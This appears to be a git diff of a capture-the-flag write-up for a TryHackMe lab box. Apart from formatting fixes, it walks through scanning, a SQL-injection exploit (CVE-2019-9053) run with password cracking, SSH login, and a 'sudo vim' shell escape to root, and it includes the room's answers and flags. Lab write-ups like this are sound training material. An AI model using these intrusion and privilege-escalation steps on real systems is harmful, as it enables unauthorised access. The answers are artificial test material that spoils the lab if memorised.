@@ -1,12 +1,12 @@
 ---
-description: 'https://tryhackme.com/room/easyctf'
+description: https://tryhackme.com/room/easyctf
 ---
 
 # Simple CTF
 
 ## INIT
 
-```text
+```
 export easyctf=10.10.150.200
 ping $easyctf
 
@@ -15,11 +15,11 @@ echo "10.10.150.200 easyctf.thm" >> /etc/hosts
 
 ## How many services are running under port 1000?
 
-```text
+```
 nmap -T5 -p1-1000 easyctf.thm
 ```
 
-![](../.gitbook/assets/image%20%28431%29.png)
+![](<../.gitbook/assets/image (415).png>)
 
 {% hint style="success" %}
 2
@@ -27,11 +27,11 @@ nmap -T5 -p1-1000 easyctf.thm
 
 ## What is running on the higher port?
 
-```text
+```
 nmap -sC -sV -T5 -p1-65535 easyctf.thm
 ```
 
-![](../.gitbook/assets/image%20%28390%29.png)
+![](<../.gitbook/assets/image (416).png>)
 
 {% hint style="success" %}
 ssh
@@ -39,29 +39,29 @@ ssh
 
 ## FTP
 
-![](../.gitbook/assets/image%20%28457%29.png)
+![](<../.gitbook/assets/image (418).png>)
 
 ## HTTP
 
-![](../.gitbook/assets/image%20%28450%29.png)
+![](<../.gitbook/assets/image (419).png>)
 
 ## GOBUSTER
 
-```text
+```
 gobuster dir -u easyctf.thm -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
 ```
 
-![](../.gitbook/assets/image%20%28432%29.png)
+![](<../.gitbook/assets/image (420).png>)
 
-![](../.gitbook/assets/image%20%28459%29.png)
+![](<../.gitbook/assets/image (421).png>)
 
 > CMS Made Simple 2.2.8
 
 ## What's the CVE you're using against the application?
 
-![](../.gitbook/assets/image%20%28446%29.png)
+![](<../.gitbook/assets/image (422).png>)
 
-![](../.gitbook/assets/image%20%28415%29.png)
+![](<../.gitbook/assets/image (423).png>)
 
 {% hint style="success" %}
 CVE-2019-9053
@@ -69,7 +69,7 @@ CVE-2019-9053
 
 ## To what kind of vulnerability is the application vulnerable?
 
-![](../.gitbook/assets/image%20%28418%29.png)
+![](<../.gitbook/assets/image (424).png>)
 
 {% hint style="success" %}
 sqli
@@ -77,11 +77,11 @@ sqli
 
 ## What's the password?
 
-```text
+```
 python3 easyctf.py -u http://easyctf.thm/simple --crack -wordlist /usr/share/wordlists/rockyou.txt
 ```
 
-![](../.gitbook/assets/image%20%28445%29.png)
+![](<../.gitbook/assets/image (429).png>)
 
 {% hint style="success" %}
 secret
@@ -89,7 +89,7 @@ secret
 
 ## Where can you login with the details obtained?
 
-![](../.gitbook/assets/image%20%28402%29.png)
+![](<../.gitbook/assets/image (426).png>)
 
 {% hint style="success" %}
 ssh
@@ -97,7 +97,7 @@ ssh
 
 ## What's the user flag?
 
-![](../.gitbook/assets/image%20%28379%29.png)
+![](<../.gitbook/assets/image (427).png>)
 
 {% hint style="success" %}
 G00d j0b, keep up!
@@ -105,7 +105,7 @@ G00d j0b, keep up!
 
 ## Is there any other user in the home directory? What's its name?
 
-![](../.gitbook/assets/image%20%28384%29.png)
+![](<../.gitbook/assets/image (428).png>)
 
 {% hint style="success" %}
 sunbath
@@ -113,7 +113,7 @@ sunbath
 
 ## What can you leverage to spawn a privileged shell?
 
-```text
+```
 sudo vim -c ':!/bin/sh'
 ```
 
@@ -125,11 +125,10 @@ vim
 
 ## What's the root flag?
 
-```text
+```
 cat /root/root.txt
 ```
 
 {% hint style="success" %}
 W3ll d0n3. You made it!
 {% endhint %}
-
